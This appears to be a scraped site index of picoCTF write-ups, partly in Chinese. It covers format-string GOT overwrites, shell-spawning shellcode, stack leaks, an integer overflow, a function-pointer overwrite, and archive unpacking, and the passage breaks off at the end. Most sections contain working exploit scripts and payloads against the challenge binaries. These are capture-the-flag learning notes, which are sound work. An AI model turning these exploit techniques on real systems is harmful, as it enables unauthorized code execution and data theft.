process(\u0026#39;./chall\u0026#39;) \u0026#39;\u0026#39;\u0026#39;############# leak libc address #############\u0026#39;\u0026#39;\u0026#39; payload1 = b\u0026#39;1 %2082c%12$hn \u0026#39; + p64(exe.got[\u0026#39;pow\u0026#39;]) payload2 = b\u0026#39;2 %109$p\u0026#39; r.recvuntil(b\u0026#39;A: \u0026#39;) r.sendline(payload1) r.recvuntil(b\u0026#39;B: \u0026#39;) r.sendline(payload2) print(r.recvuntil(b\u0026#34; 2 0x\u0026#34;)) return_value = int(r.recv(12).strip(), 16) libc_addr = return_value - 243 - offset___libc_start_main_ret success(f\u0026#34;Return Value = {hex(return_value)}\u0026#34;) success(f\u0026#34;libc address = {hex(libc_addr)}\u0026#34;) success(f\u0026#34;libc system address = {hex(libc_addr + offset_system)}\u0026#34;) # success(f\u0026#34;libc system address = {hex(libc_addr + offset_system_local)}\u0026#34;) # success(f\u0026#34;libc address = {hex(libc_addr - offset___libc_start_main_ret_local)}\u0026#34;) \u0026#39;\u0026#39;\u0026#39;############# Get Shell #############\u0026#39;\u0026#39;\u0026#39; # raw_input() third = (libc.sym[\u0026#39;system\u0026#39;]\u0026gt;\u0026gt;16)\u0026amp;0xff bottom = libc.sym[\u0026#39;system\u0026#39;] \u0026amp; 0xffff first = third - 21 second = bottom - third payload1 = f\u0026#39;1 %{first}c%43$hhn%{second}c%44$hn\u0026#39; payload2 = b\u0026#39;2\u0026#39;.ljust(8, b\u0026#39; \u0026#39;) + p64(exe.got[\u0026#39;atoi\u0026#39;]+2) + p64(exe.got[\u0026#39;atoi\u0026#39;]) r.recvuntil(b\u0026#39;A: \u0026#39;) r.sendline(payload1) r.recvuntil(b\u0026#39;B: \u0026#39;) r.sendline(payload2) r.interactive() Flag: picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}\nReference # libc database search\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nfermat-strings\u0026#160;\u0026#x21a9;\u0026#xfe0e;\npicoMini by redpwn\u0026#160;\u0026#x21a9;\u0026#xfe0e;\npicoMini by redpwn 2021 - Darin\u0026rsquo;s Challenges\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":259,"href":"/security/practice/picoctf/misc/general/picoctf---file-types/","title":"PicoCTF - File types","section":"Securities","content":" PicoCTF - File types # tags: PicoCTF CTF Misc # Challenge: File types\nBackground # For Shell Script # Linux MD5 Linux egrep命令 Shell test 命令\n-f 文件名: 如果文件存在且为普通文件则为真\nHow to modify $PATH touch - time stamp What is $$ in bash?\nFor Compress Command # Linux 備份檔案操作 cpio 指令教學與範例 bzip2 command in Linux Gzip Command in Linux Lzip Manual lz4 manual lzma manual lzop(1) - Linux man page\nSource code # :::spoiler Flag.pdf\n#!/bin/sh # This is a shell archive (produced by GNU sharutils 4.15.2). # To extract the files from this archive, save it to some FILE, remove # everything before the \u0026#39;#!/bin/sh\u0026#39; line above, then type \u0026#39;sh FILE\u0026#39;. # lock_dir=_sh00046 # Made on 2022-03-15 06:50 UTC by \u0026lt;root@e8647f66bc56\u0026gt;. # Source directory was \u0026#39;/app\u0026#39;. # # Existing files will *not* be overwritten, unless \u0026#39;-c\u0026#39; is specified. # # This shar contains: # length mode name # ------ ---------- ------------------------------------------ # 1092 -rw-r--r-- flag # MD5SUM=${MD5SUM-md5sum} f=`${MD5SUM} --version | egrep \u0026#39;^md5sum .*(core|text)utils\u0026#39;` test -n \u0026#34;${f}\u0026#34; \u0026amp;\u0026amp; md5check=true || md5check=false ${md5check} || \\ echo \u0026#39;Note: not verifying md5sums. Consider installing GNU coreutils.\u0026#39; if test \u0026#34;X$1\u0026#34; = \u0026#34;X-c\u0026#34; then keep_file=\u0026#39;\u0026#39; else keep_file=true fi echo=echo save_IFS=\u0026#34;${IFS}\u0026#34; IFS=\u0026#34;${IFS}:\u0026#34; gettext_dir= locale_dir= set_echo=false for dir in $PATH do if test -f $dir/gettext \\ \u0026amp;\u0026amp; ($dir/gettext --version \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) then case `$dir/gettext --version 2\u0026gt;\u0026amp;1 | sed 1q` in *GNU*) gettext_dir=$dir set_echo=true break ;; esac fi done if ${set_echo} then set_echo=false for dir in $PATH do if test -f $dir/shar \\ \u0026amp;\u0026amp; ($dir/shar --print-text-domain-dir \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) then locale_dir=`$dir/shar --print-text-domain-dir` set_echo=true break fi done if ${set_echo} then TEXTDOMAINDIR=$locale_dir export TEXTDOMAINDIR TEXTDOMAIN=sharutils export TEXTDOMAIN echo=\u0026#34;$gettext_dir/gettext -s\u0026#34; fi fi IFS=\u0026#34;$save_IFS\u0026#34; if (echo \u0026#34;testing\\c\u0026#34;; echo 1,2,3) | grep c \u0026gt;/dev/null then if (echo -n test; echo 1,2,3) | grep n \u0026gt;/dev/null then shar_n= shar_c=\u0026#39; \u0026#39; else shar_n=-n shar_c= ; fi else shar_n= shar_c=\u0026#39;\\c\u0026#39; ; fi f=shar-touch.$$ st1=200112312359.59 st2=123123592001.59 st2tr=123123592001.5 # old SysV 14-char limit st3=1231235901 if touch -am -t ${st1} ${f} \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; \\ test ! -f ${st1} \u0026amp;\u0026amp; test -f ${f}; then shar_touch=\u0026#39;touch -am -t $1$2$3$4$5$6.$7 \u0026#34;$8\u0026#34;\u0026#39; elif touch -am ${st2} ${f} \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; \\ test ! -f ${st2} \u0026amp;\u0026amp; test ! -f ${st2tr} \u0026amp;\u0026amp; test -f ${f}; then shar_touch=\u0026#39;touch -am $3$4$5$6$1$2.$7 \u0026#34;$8\u0026#34;\u0026#39; elif touch -am ${st3} ${f} \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; \\ test ! -f ${st3} \u0026amp;\u0026amp; test -f ${f}; then shar_touch=\u0026#39;touch -am $3$4$5$6$2 \u0026#34;$8\u0026#34;\u0026#39; else shar_touch=: echo ${echo} \u0026#39;WARNING: not restoring timestamps. Consider getting and installing GNU \u0026#39;\\\u0026#39;\u0026#39;touch\u0026#39;\\\u0026#39;\u0026#39;, distributed in GNU coreutils...\u0026#39; echo fi rm -f ${st1} ${st2} ${st2tr} ${st3} ${f} # if test ! -d ${lock_dir} ; then : else ${echo} \u0026#34;lock directory ${lock_dir} exists\u0026#34; exit 1 fi if mkdir ${lock_dir} then ${echo} \u0026#34;x - created lock directory ${lock_dir}.\u0026#34; else ${echo} \u0026#34;x - failed to create lock directory ${lock_dir}.\u0026#34; exit 1 fi # ============= flag ============== if test -n \u0026#34;${keep_file}\u0026#34; \u0026amp;\u0026amp; test -f \u0026#39;flag\u0026#39; then ${echo} \u0026#34;x - SKIPPING flag (file already exists)\u0026#34; else ${echo} \u0026#34;x - extracting flag (text)\u0026#34; sed \u0026#39;s/^X//\u0026#39; \u0026lt;\u0026lt; \u0026#39;SHAR_EOF\u0026#39; | uudecode \u0026amp;\u0026amp; begin 600 flag M(3QA\u0026lt;F-H/@IF;\u0026amp;%G+R`@(\u0026#34;`@(\u0026#34;`@(\u0026#34;`@,\u0026#34;`@(\u0026#34;`@(\u0026#34;`@(\u0026#34;`@,\u0026#34;`@(\u0026#34;`@,\u0026#34;`@ M(\u0026#34;`@-C0T(\u0026#34;`@(\u0026#34;`Q,#(T(\u0026#34;`@(\u0026#34;`@8`K\u0026#39;\u0026lt;6D`\u0026amp;[RD@0`````!````,\u0026amp;(\\-P4` M``#_`69L86\u0026lt;``$)::#DQ05DF4UG8%@C,```E___[Y[M[G]GO[=^W[_N__^6^ MYJGOD+YKS[D]VU]`\u0026gt;Q]/?;`!\u0026amp;;\u0026#34;0\u0026amp;@:`!H:`T:9-`#3330T:::`!H-\u0026#39;J:``8 MC0:!H,C1HR#1HR,C)ZFFCU-\u0026#39;E\u0026#39;J8T:AR`Q#1B`-`\u0026amp;3330`80:`!B,!,1DT-` M`#$\u0026amp;1ID9#!,@R::\u0026amp;$PAHR#3\u0026#34;JGZ4R,C1HTT#U\u0026amp;(80#1H`9,C1ZF0Q`9``\u0026gt;H` M!D````]3$`,F(`T\u0026amp;AHT!`$`-$2N?R0*H(%R04*\u0026lt;D(7$`\\\u0026#34;P\u0026#34;6J(/ORS5EV\u0026#39;E MY1A`\\T1\u0026gt;[HJ%R[CD]7UCS7E.#93IHR*#^?R7/$W6*1]HGQ=6EJ_/A$B_2\u0026lt;_G M5]3/.*(B)V8P\\40AS.5X\u0026lt;KE?9IM4\u0026#39;Q\u0026lt;3\u0026amp;PH+K\u0026#34;FJ)I6/1XOFW@W\u0026lt;,00\u0026lt;]B\u0026gt;2 MPX5/\u0026gt;V_P:DLC2^\u0026gt;A1^[\u0026gt;Y#?DS\u0026#34;9KG7[]/=\u0026lt;ASJ7MJ$$R\u0026amp;\\`6.9W\u0026#34;)P6VS9LD M.F7L4\u0026#34;\\Y$H\\1@O$:/N]]\u0026lt;+E+8B9)\u0026#34;\u0026#39;%;)PX-A@F\\-3%=ICS(%E2AC+#,!8,\u0026lt; MZ%O`\u0026lt;_HMM@M%6#]!6\u0026#34;7]`2W:!\\.3@RYX$/2\u0026amp;/(\\:I$\u0026lt;N@*34)6G+(BNGHY5V M0T)XU\u0026amp;!)Q5B-(=%VD-NN\u0026#39;6ZZ(BF`XC3PJ\\R/QN6:)#XCNK?X%$*H\u0026gt;1Z(HQ\u0026gt;C M#5HSE`/XJAZ-J?*((R/%CB[DBG\u0026#34;A(;`L$9@`QW$``````````````0`````` M```+``````!44D%)3$52(2$A```````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` ,```````````````` ` end SHAR_EOF (set 20 22 03 15 06 50 36 \u0026#39;flag\u0026#39; eval \u0026#34;${shar_touch}\u0026#34;) \u0026amp;\u0026amp; \\ chmod 0644 \u0026#39;flag\u0026#39; if test $? -ne 0 then ${echo} \u0026#34;restore of flag failed\u0026#34; fi if ${md5check} then ( ${MD5SUM} -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || ${echo} \u0026#39;flag\u0026#39;: \u0026#39;MD5 check failed\u0026#39; ) \u0026lt;\u0026lt; \\SHAR_EOF b5cc2c5756410f2467168f6d4c468f52 flag SHAR_EOF else test `LC_ALL=C wc -c \u0026lt; \u0026#39;flag\u0026#39;` -ne 1092 \u0026amp;\u0026amp; \\ ${echo} \u0026#34;restoration warning: size of \u0026#39;flag\u0026#39; is not 1092\u0026#34; fi fi if rm -fr ${lock_dir} then ${echo} \u0026#34;x - removed lock directory ${lock_dir}.\u0026#34; else ${echo} \u0026#34;x - failed to remove lock directory ${lock_dir}.\u0026#34; exit 1 fi exit 0 :::\nExploit - Google and Uncompress # :::spoiler whole process\n# shell script $ file Flag.pdf Flag.pdf: POSIX shell script, ASCII text executable, with CRLF line terminators $ mv Flag.pdf Flag.sh # debug $ chmod 777 Flag.sh $ ./Flag.sh zsh: ./Flag.sh: bad interpreter: /bin/sh^M: no such file or directory $ sed -i -e \u0026#39;s/\\r$//\u0026#39; Flag.sh $ ./Flag.sh x - created lock directory _sh00046. x - extracting flag (text) x - removed lock directory _sh00046. # ar $ ls Flag.pdf Flag.sh flag $ file flag flag: current ar archive $ mv flag flag.ar $ ar -x flag.ar # cpio $ ls Flag.pdf Flag.sh flag flag.ar $ file flag flag: cpio archive $ mv flag flag.cpio $ cpio -iv \u0026lt; flag.cpio flag 2 blocks # bzip2 $ ls Flag.pdf Flag.sh flag flag.ar flag.cpio $ file flag flag: bzip2 compressed data, block size = 900k $ mv flag flag.bz2 $ bzip2 -d flag.bz2 # gzip $ ls Flag.pdf Flag.sh flag flag.ar flag.cpio $ file flag flag: gzip compressed data, was \u0026#34;flag\u0026#34;, last modified: Tue Mar 15 06:50:36 2022, from Unix, original size modulo 2^32 329 $ mv flag flag.gz $ gzip -d flag.gz # lzip $ ls Flag.pdf Flag.sh flag flag.ar flag.cpio $ file flag flag: lzip compressed data, version: 1 $ mv flag flag.lz $ lzip -d flag.lz # lz4 $ ls Flag.pdf Flag.sh flag flag.ar flag.cpio $ file flag flag: LZ4 compressed data (v1.4+) $ mv flag flag.lz4 $ lz4 -d flag.lz4 Decoding file flag flag.lz4 : decoded 266 bytes # lzma $ ls Flag.pdf Flag.sh flag flag.ar flag.cpio flag.lz4 $ file flag flag: LZMA compressed data, non-streamed, size 255 $ mv flag flag.lzma $lzma -d flag.lzma # lzop $ ls Flag.pdf Flag.sh flag flag.ar flag.cpio flag.lz4 $ file flag flag: lzop compressed data - version 1.040, LZO1X-1, os: Unix $ mv flag flag.lzo $ lzop -d flag.lzo # lzip $ ls Flag.pdf Flag.sh flag flag.ar flag.cpio flag.lz4 flag.lzo $ file flag flag: lzip compressed data, version: 1 $ mv flag flag.lz $ lzip -d flag.lz # xz $ls Flag.pdf Flag.sh flag flag.ar flag.cpio flag.lz4 flag.lzo $file flag flag: XZ compressed data $mv flag flag.xz ~/CTF/P/M/File_types $ xz -d flag.xz # Completely Uncompressed $ls Flag.pdf Flag.sh flag flag.ar flag.cpio flag.lz4 flag.lzo $file flag flag: ASCII text $cat flag | xxd -r -p picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_3c79c5ba} :::\nReference # Bash script – \u0026ldquo;/bin/bash^M: bad interpreter: No such file or directory\u0026rdquo; Convert Hex to ASCII\n"},{"id":260,"href":"/security/practice/picoctf/pwn/picoctf---filtered-shellcode/","title":"PicoCTF - filtered-shellcode","section":"Securities","content":" PicoCTF - filtered-shellcode # Background # Shell Code Reverse\nSource code # :::spoiler Source Code Got From Server After Get Shell\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define MAX_LENGTH 1000 void execute(char *shellcode, size_t length) { if (!shellcode || !length) { exit(1); } size_t new_length = length * 2; char result[new_length + 1]; int spot = 0; for (int i = 0; i \u0026lt; new_length; i++) { if ((i % 4) \u0026lt; 2) { result[i] = shellcode[spot++]; } else { result[i] = \u0026#39;\\x90\u0026#39;; } } // result[new_length] = \u0026#39;\\xcc\u0026#39;; result[new_length] = \u0026#39;\\xc3\u0026#39;; // Execute code int (*code)() = (int(*)())result; code(); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); char buf[MAX_LENGTH]; size_t length = 0; char c = \u0026#39;\\0\u0026#39;; printf(\u0026#34;Give me code to run:\\n\u0026#34;); c = fgetc(stdin); while ((c != \u0026#39;\\n\u0026#39;) \u0026amp;\u0026amp; (length \u0026lt; MAX_LENGTH)) { buf[length] = c; c = fgetc(stdin); length++; } if (length % 2) { buf[length] = \u0026#39;\\x90\u0026#39;; length++; } execute(buf, length); return 0; } :::\nRecon # 這一題沒有很難，但我沒有解出來，主要是因為reverse看不懂，完了QAQ，IDA都亂翻，只能求助於1，其實很簡單，好像也沒有filter的成分在，如果限制只能用每次兩bytes寫shell code不算的話\n其實就兩個function，一個是main function，另外一個是execute function，execute function主要會每一個shell code中間插入兩個nop，然後用function pointer的方式執行，所以我們的目標是寫一個shell code script開server的shell 重點是shell code的instruction只能用2 bytes的instruction，所以沒辦法用類似mov eax, 0x6e69622f的這種方式，會GG，原因出自於execute function的for loop，他會把我們寫的shell code用2 bytes的方式切開，然後中間塞兩個nop(也就是兩個\\x90，也是兩個bytes)，所以這其實就是限制我們只能用2 bytes寫shell code if ((i % 4) \u0026lt; 2) {result[i] = shellcode[spot++];} else {result[i] = \u0026#39;\\x90\u0026#39;;} 所以不能隨便用exploit db上找到的shell code複製貼上，或是用以下payload，必須要善用shl，只要shl 16次(也就是2 bytes)就可以同時方式0x6e69622f，效果和mov eax, 0x6e69622f一樣 payload = asm(\u0026#34;\u0026#34;\u0026#34; mov eax, 0x6e69622f push eax mov eax, 0x0068732f push eax xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx mov eax, 0xb lea ebx, DWORD PTR [esp] int 0x80 \u0026#34;\u0026#34;\u0026#34;) Exploit - Write Properly Shell Code # from pwn import * r = process(\u0026#39;./fun\u0026#39;) # r = remote(\u0026#39;mercury.picoctf.net\u0026#39;, 35338) r.recvline() payload = asm(\u0026#34;\u0026#34;\u0026#34; /*Put the syscall number of execve in eax*/ xor eax, eax mov al, 0xb /*Put zero in ecx and edx*/ xor ecx, ecx xor edx, edx /*Push \u0026#34;/sh\\x00\u0026#34; on the stack*/ xor ebx, ebx mov bl, 0x68 shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx mov bh, 0x73 mov bl, 0x2f push ebx nop /*Push \u0026#34;/bin\u0026#34; on the stack*/ mov bh, 0x6e mov bl, 0x69 shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx mov bh, 0x62 mov bl, 0x2f push ebx nop /*Move the esp (that points to \u0026#34;/bin/sh\\x00\u0026#34;) in ebx*/ mov ebx, esp/*Syscall*/ int 0x80 \u0026#34;\u0026#34;\u0026#34;) r.sendline(payload) r.interactive() Reference # PicoCTF - Filtered Shellcode [Pwn]\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":261,"href":"/security/practice/picoctf/pwn/picoctf---flag-leak/","title":"PicoCTF - flag leak","section":"Securities","content":" PicoCTF - flag leak # Background # Format String Bug Source code # :::spoiler\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;wchar.h\u0026gt; #include \u0026lt;locale.h\u0026gt; #define BUFSIZE 64 #define FLAGSIZE 64 void readflag(char* buf, size_t len) { FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,len,f); // size bound read } void vuln(){ char flag[BUFSIZE]; char story[128]; readflag(flag, FLAGSIZE); printf(\u0026#34;Tell me a story and then I\u0026#39;ll tell you one \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%127s\u0026#34;, story); printf(\u0026#34;Here\u0026#39;s a story - \\n\u0026#34;); printf(story); printf(\u0026#34;\\n\u0026#34;); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); return 0; } :::\nRecon # 這一題比計安教的還簡單，不過我全忘了QQ 先用gdb跟一下，發現在stack的地方有flag的痕跡，記一下相對位置就可以print出來，如果怕不同device會有問題的話就多幾個\nExploit # Payload: %20$s%21$s%22$s%23$s%24$s%25$s%26$s\npython -c \u0026#39;print(\u0026#34;%20$s%21$s%22$s%23$s%24$s%25$s%26$s\u0026#34;)\u0026#39; | nc saturn.picoctf.net 50811 Tell me a story and then I\u0026#39;ll tell you one \u0026gt;\u0026gt; Here\u0026#39;s a story - ������e� setresgidCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}���̓\u0010ii Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}\n"},{"id":262,"href":"/security/practice/picoctf/general-skills/picoctf---flag_shop/","title":"PicoCTF - flag_shop","section":"Securities","content":" PicoCTF - flag_shop # tags: PicoCTF CTF General Skill # Background # Bof\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { setbuf(stdout, NULL); int con; con = 0; int account_balance = 1100; while(con == 0){ printf(\u0026#34;Welcome to the flag exchange\\n\u0026#34;); printf(\u0026#34;We sell flags\\n\u0026#34;); printf(\u0026#34;\\n1. Check Account Balance\\n\u0026#34;); printf(\u0026#34;\\n2. Buy Flags\\n\u0026#34;); printf(\u0026#34;\\n3. Exit\\n\u0026#34;); int menu; printf(\u0026#34;\\n Enter a menu selection\\n\u0026#34;); fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;menu); if(menu == 1){ printf(\u0026#34;\\n\\n\\n Balance: %d \\n\\n\\n\u0026#34;, account_balance); } else if(menu == 2){ printf(\u0026#34;Currently for sale\\n\u0026#34;); printf(\u0026#34;1. Defintely not the flag Flag\\n\u0026#34;); printf(\u0026#34;2. 1337 Flag\\n\u0026#34;); int auction_choice; fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;auction_choice); if(auction_choice == 1){ printf(\u0026#34;These knockoff Flags cost 900 each, enter desired quantity\\n\u0026#34;); int number_flags = 0; fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;number_flags); if(number_flags \u0026gt; 0){ int total_cost = 0; total_cost = 900*number_flags; printf(\u0026#34;\\nThe final cost is: %d\\n\u0026#34;, total_cost); if(total_cost \u0026lt;= account_balance){ account_balance = account_balance - total_cost; printf(\u0026#34;\\nYour current balance after transaction: %d\\n\\n\u0026#34;, account_balance); } else{ printf(\u0026#34;Not enough funds to complete purchase\\n\u0026#34;); } } } else if(auction_choice == 2){ printf(\u0026#34;1337 flags cost 100000 dollars, and we only have 1 in stock\\n\u0026#34;); printf(\u0026#34;Enter 1 to buy one\u0026#34;); int bid = 0; fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;bid); if(bid == 1){ if(account_balance \u0026gt; 100000){ FILE *f = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if(f == NULL){ printf(\u0026#34;flag not found: please run this on the server\\n\u0026#34;); exit(0); } char buf[64]; fgets(buf, 63, f); printf(\u0026#34;YOUR FLAG IS: %s\\n\u0026#34;, buf); } else{ printf(\u0026#34;\\nNot enough funds for transaction\\n\\n\\n\u0026#34;); }} } } else{ con = 1; } } return 0; } :::\nRecon # 這是一個互動題，一開始持有的金額是1100，但看了source code發現他把flag放在1337 Flag這邊，但需要花10000元購買，所以一定有可以增加錢錢的漏洞，就是BoF，看了source code應該是在1. Defintely not the flag Flag這邊，只要輸入足夠大的數字即可\nExploit - BoF # nc jupiter.challenges.picoctf.org 9745 Welcome to the flag exchange We sell flags 1. Check Account Balance 2. Buy Flags 3. Exit Enter a menu selection 2 Currently for sale 1. Defintely not the flag Flag 2. 1337 Flag 1 These knockoff Flags cost 900 each, enter desired quantity 99999999999 The final cost is: -1039688580 Your current balance after transaction: 1039689680 Welcome to the flag exchange We sell flags 1. Check Account Balance 2. Buy Flags 3. Exit Enter a menu selection 2 Currently for sale 1. Defintely not the flag Flag 2. 1337 Flag 2 1337 flags cost 100000 dollars, and we only have 1 in stock Enter 1 to buy one1 YOUR FLAG IS: picoCTF{m0n3y_bag5_65d67a74} Welcome to the flag exchange We sell flags 1. Check Account Balance 2. Buy Flags 3. Exit Enter a menu selection 3 Reference # "},{"id":263,"href":"/security/practice/picoctf/reverse/picoctf---forky/","title":"PicoCTF - Forky","section":"Securities","content":" PicoCTF - Forky # Background # fork用法與範例 Source code # Main Function From IDA\nint __cdecl main(int argc, const char **argv, const char **envp) { _DWORD *v4; // [esp+8h] [ebp-Ch] v4 = mmap(0, 4u, 3, 33, -1, 0); *v4 = 1000000000; fork(); fork(); fork(); fork(); *v4 += 1234567890; doNothing(*v4); return 0; } Recon # 這一題很有趣，有了background之後其實對這一題的想法差不多就和1差不多，也就是parent process fork出child process後會繼續往下fork出grandchild process，直到parent process執行完成\n+ | +-----------------------------------+ | | +-----------------+ +-----------------+ | | | | +--------+ +--------+ +--------+ +--------+ | | | | | | | | +---+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ | | | | | | | | | | | | | | | | O O O O O O O O O O O O O O O O 而且他們所操作的外部記憶體對象都會是一樣的，代表*v4最終會被加16次，只是我沒有考慮到負號的問題，因為該題是32bits，代表加到一定程度會overflow，所以都沒解出來\nExploit # \u0026gt;\u0026gt;\u0026gt; base = np.array(1000000000).astype(np.int32) \u0026gt;\u0026gt;\u0026gt; step = np.array(1234567890).astype(np.int32) \u0026gt;\u0026gt;\u0026gt; str(np.array(20753086240).astype(np.int32)) \u0026#39;-721750240\u0026#39; Flag: picoCTF{-721750240}\nReference # Forky - WP\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":264,"href":"/security/practice/picoctf/pwn/picoctf---function-overwrite/","title":"PicoCTF - function overwrite","section":"Securities","content":" PicoCTF - function overwrite # Background # Array Bound\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;wchar.h\u0026gt; #include \u0026lt;locale.h\u0026gt; #define BUFSIZE 64 #define FLAGSIZE 64 int calculate_story_score(char *story, size_t len) { int score = 0; for (size_t i = 0; i \u0026lt; len; i++) { score += story[i]; } return score; } void easy_checker(char *story, size_t len) { if (calculate_story_score(story, len) == 1337) { char buf[FLAGSIZE] = {0}; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf, FLAGSIZE, f); // size bound read printf(\u0026#34;You\u0026#39;re 1337. Here\u0026#39;s the flag.\\n\u0026#34;); printf(\u0026#34;%s\\n\u0026#34;, buf); } else { printf(\u0026#34;You\u0026#39;ve failed this class.\u0026#34;); } } void hard_checker(char *story, size_t len) { if (calculate_story_score(story, len) == 13371337) { char buf[FLAGSIZE] = {0}; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf, FLAGSIZE, f); // size bound read printf(\u0026#34;You\u0026#39;re 13371337. Here\u0026#39;s the flag.\\n\u0026#34;); printf(\u0026#34;%s\\n\u0026#34;, buf); } else { printf(\u0026#34;You\u0026#39;ve failed this class.\u0026#34;); } } void (*check)(char*, size_t) = hard_checker; int fun[10] = {0}; void vuln() { char story[128]; int num1, num2; printf(\u0026#34;Tell me a story and then I\u0026#39;ll tell you if you\u0026#39;re a 1337 \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%127s\u0026#34;, story); printf(\u0026#34;On a totally unrelated note, give me two numbers. Keep the first one less than 10.\\n\u0026#34;); scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;num1, \u0026amp;num2); if (num1 \u0026lt; 10) { fun[num1] += num2; } check(story, strlen(story)); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); return 0; } :::\nRecon # $ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8b6f3ccbb344c3ba91ef077e29c8ab9d6e2da011, for GNU/Linux 3.2.0, not stripped $ checksec vuln [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/PWN/function overwrite/vuln\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 這一題比想像中簡單，流程是這樣的，他的function pointer原本預設是指像hard_checker，而它裡面做的事情就是把我們輸入的所有字元以ascii的方式加總，如果加總的結果是13371337，就可以讀到flag，但是我們可以做一個簡單的換算，一個字元最多1 byte，也就是最大0xff，他設定最多只能輸入127個字元，代表0xff*127=32385，遠遠低於13371337，而題目有提供另外一個checker也就是easy_checker，他只需要最後的加總是1337就可以了，代表完全有可能實現(例如：\u0026lsquo;z\u0026rsquo;*10+\u0026lsquo;u\u0026rsquo;$\\to$0x7a*10+0x75)，現在的問題是要怎麼把一開始的function pointer指向easy_checker?\n題目故意叫我們輸入兩個數字還特別在hint的地方說\nDon\u0026rsquo;t be so negative 其實就是題是array bound的問題，所以簡單用gdb跟一下就可以換算fun array和check function pointer之間的差距還有該加上多少會變成easy_checker的地址\nExploit # from pwn import * # r = process(\u0026#39;./vuln\u0026#39;) r = remote(\u0026#39;saturn.picoctf.net\u0026#39;, 58094) easy_checker_addr = 0x080492fc r.recvuntil(b\u0026#39;\u0026gt;\u0026gt; \u0026#39;) r.sendline(b\u0026#39;z\u0026#39; * 10 + b\u0026#39;u\u0026#39;) r.recvline() r.sendline(b\u0026#39;-16\u0026#39;) r.sendline(b\u0026#39;-314\u0026#39;) r.interactive() Flag: picoCTF{0v3rwrit1ng_P01nt3rs_ded38e3b}\n"},{"id":265,"href":"/security/practice/picoctf/reverse/picoctf---gogo/","title":"PicoCTF - gogo","section":"Securities","content":" PicoCTF - gogo # Source code # :::spoiler IDA Main Function\n// main.main void __cdecl main_main() { _slice_interface_ typ[2]; // [esp+0h] [ebp-58h] BYREF string *second_flag; // [esp+20h] [ebp-38h] string *flag; // [esp+24h] [ebp-34h] _slice_interface_ v3; 